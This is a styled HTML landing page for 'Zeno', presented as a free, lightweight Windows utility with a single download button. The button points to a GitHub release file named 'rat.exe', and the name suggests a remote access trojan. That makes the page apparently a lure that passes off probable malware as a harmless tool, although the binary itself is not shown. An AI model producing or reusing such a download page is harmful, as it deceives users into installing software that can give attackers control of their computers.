<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover">
  <title>Zeno</title>
  <link rel="preconnect" href="https://fonts.googleapis.com">
  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet">
  <style>
    :root {
      --bg:      #070707;
      --surface: #101010;
      --border:  #1c1c1c;
      --white:   #f5f5f5;
      --muted:   #3d3d3d;
      --faint:   #222222;
    }

    *, *::before, *::after {
      box-sizing: border-box;
      margin: 0;
      padding: 0;
    }

    html, body {
      height: 100%;
    }

    body {
      background: var(--bg);
      color: var(--white);
      font-family: 'Inter', system-ui, sans-serif;
      display: grid;
      grid-template-rows: auto 1fr auto;
      min-height: 100%;
      overflow-x: hidden;
    }

    /* ── Grain texture ── */
    .grain {
      position: fixed;
      inset: 0;
      pointer-events: none;
      z-index: 900;
      opacity: 0.048;
      filter: url(#grain-svg);
      background: white;
    }

    /* ── Background glow ── */
    .bg-glow {
      position: fixed;
      top: -20vh;
      left: 50%;
      translate: -50% 0;
      width: 560px;
      height: 560px;
      background: radial-gradient(circle, rgba(255,255,255,0.065) 0%, transparent 70%);
      pointer-events: none;
      z-index: 0;
      animation: pulse 9s ease-in-out infinite;
    }
    @keyframes pulse {
      0%,100% { opacity: .55; scale: 1;    }
      50%      { opacity: 1;   scale: 1.08; }
    }

    /* ── Header ── */
    header {
      position: relative;
      z-index: 10;
      display: flex;
      align-items: center;
      justify-content: space-between;
      padding: 26px 44px;
      border-bottom: 1px solid var(--border);
    }

    .logo {
      font-size: 14px;
      font-weight: 600;
      color: var(--white);
      letter-spacing: -.01em;
    }

    .vtag {
      font-size: 11px;
      font-weight: 500;
      color: var(--muted);
      background: var(--surface);
      border: 1px solid var(--border);
      border-radius: 6px;
      padding: 4px 10px;
      letter-spacing: .04em;
    }

    /* ── Main / Hero ── */
    main {
      position: relative;
      z-index: 10;
      display: flex;
      align-items: center;
      justify-content: center;
      padding: 0 24px;
    }

    .hero {
      display: flex;
      flex-direction: column;
      align-items: center;
      text-align: center;
      animation: rise .65s cubic-bezier(0.16, 1, 0.3, 1) both;
    }
    @keyframes rise {
      from { opacity: 0; translate: 0 18px; }
      to   { opacity: 1; translate: 0 0; }
    }

    h1 {
      font-size: clamp(64px, 12vw, 108px);
      font-weight: 700;
      letter-spacing: -.05em;
      line-height: 1;
      color: #ffffff;
      margin-bottom: 22px;
    }

    .subtitle {
      font-size: 14px;
      font-weight: 300;
      color: var(--muted);
      letter-spacing: .01em;
      line-height: 1.7;
      max-width: 280px;
      margin-bottom: 52px;
    }

    /* ── Download button ── */
    .dl-btn {
      position: relative;
      display: inline-flex;
      align-items: center;
      gap: 9px;
      padding: 13px 30px;
      background: var(--white);
      color: #080808;
      font-family: inherit;
      font-size: 13.5px;
      font-weight: 600;
      text-decoration: none;
      border-radius: 999px;
      overflow: hidden;
      transition: background .2s, translate .15s ease, box-shadow .2s;
      box-shadow: 0 2px 16px rgba(255,255,255,0.07);
    }

    /* shimmer sweep */
    .dl-btn::after {
      content: '';
      position: absolute;
      inset: 0;
      background: linear-gradient(
        112deg,
        transparent 33%,
        rgba(0,0,0,0.07) 50%,
        transparent 67%
      );
      translate: -130% 0;
    }
    .dl-btn:hover {
      background: #e9e9e9;
      translate: 0 -2px;
      box-shadow:
        0 0 0 6px rgba(255,255,255,0.06),
        0 6px 28px rgba(255,255,255,0.11);
    }
    .dl-btn:hover::after {
      translate: 130% 0;
      transition: translate .5s ease;
    }
    .dl-btn:active {
      translate: 0 0;
      transition-duration: .07s;
    }

    .win-icon {
      width: 15px;
      height: 15px;
      opacity: .65;
      flex-shrink: 0;
    }

    /* ── File meta ── */
    .meta {
      display: flex;
      align-items: center;
      gap: 14px;
      margin-top: 22px;
      font-size: 11px;
      font-weight: 400;
      color: var(--muted);
      letter-spacing: .03em;
    }
    .meta-line {
      width: 1px;
      height: 11px;
      background: var(--faint);
    }

    /* ── Footer ── */
    footer {
      position: relative;
      z-index: 10;
      display: flex;
      align-items: center;
      justify-content: center;
      padding: 24px 44px;
      border-top: 1px solid var(--border);
      font-size: 11px;
      color: var(--muted);
      letter-spacing: .02em;
    }

    /* ── Reduced motion ── */
    @media (prefers-reduced-motion: reduce) {
      .hero           { animation: none; }
      .bg-glow        { animation: none; }
      .dl-btn::after  { display: none;   }
    }

    @media (max-width: 500px) {
      header, footer { padding: 20px 24px; }
    }
  </style>
</head>
<body>

  <!-- Grain filter -->
  <svg style="display:none" xmlns="http://www.w3.org/2000/svg">
    <filter id="grain-svg">
      <feTurbulence type="fractalNoise" baseFrequency="0.78" numOctaves="4" stitchTiles="stitch"/>
      <feColorMatrix type="saturate" values="0"/>
    </filter>
  </svg>
  <div class="grain" aria-hidden="true"></div>

  <div class="bg-glow" aria-hidden="true"></div>

  <header>
    <span class="logo">Zeno</span>
    <span class="vtag">v1.0</span>
  </header>

  <main>
    <div class="hero">
      <h1>Zeno</h1>

      <p class="subtitle">A lightweight Windows utility,<br>built for speed.</p>

      <a class="dl-btn"
         href="https://github.com/zeno1011/zeno1011-github.io/releases/download/v1.0/rat.exe"
         download>
        <svg class="win-icon" viewBox="0 0 24 24" fill="currentColor">
          <path d="M0 3.449L9.75 2.1v9.45H0m10.949-9.602L24 0v11.4H10.949M0 12.6h9.75v9.451L0 20.699M10.949 12.6H24V24l-12.9-1.801"/>
        </svg>
        Download for Windows
      </a>

      <div class="meta">
        <span>Version 1.0</span>
        <span class="meta-line"></span>
        <span>Windows 10 / 11</span>
        <span class="meta-line"></span>
        <span>Free</span>
      </div>
    </div>
  </main>

  <footer>
    © 2026 Zeno
  </footer>

</body>
</html>
